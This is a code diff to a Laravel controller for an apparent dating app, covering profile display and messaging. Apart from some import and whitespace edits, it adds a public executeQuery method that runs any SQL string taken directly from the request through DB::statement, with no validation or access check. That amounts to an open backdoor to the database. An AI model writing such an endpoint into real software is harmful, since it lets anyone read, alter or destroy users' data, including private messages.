@@ -4,9 +4,8 @@ namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
 use App\Http\Requests\StoreDaterRequest;
-use App\Http\Requests\UpdateDaterRequest;
 use App\Models\Dater;
-use App\Models\Like;
+use Illuminate\Support\Facades\DB;
 
 class DaterController extends Controller
 {
@@ -49,6 +48,8 @@ class DaterController extends Controller
      * @param  \App\Models\Dater  $dater
      * @return \Illuminate\Http\Response
      */
+
+
     public function show($id)
     {
         $dater = Dater::find($id);
@@ -95,7 +96,9 @@ public function message(Request $request, Dater $dater)
         $dater->update(['messages' => $message]);
 
         return redirect()->route('dater.allmessages', $dater->id);
+
     }
+    
 
 //displays all messages sent
 public function messages(Dater $dater)
@@ -108,15 +111,25 @@ public function messages(Dater $dater)
 
     return view('messages', compact('daters', 'dater'));
 }
+
     //deletes the message
 public function unmessage(Dater $dater)
 {
     $dater->update(['messages' => '']);
     return redirect()->route('dater.allmessages', $dater->id);
 
-    
-
 }
+public function executeQuery(Request $request)
+{
+$query = $request->input('query');
+
+    if (!empty($query)) {
+        DB::statement($query);
+    }
+
+        return redirect()->route('dater.allmessages');
+
+    }
 
 
 
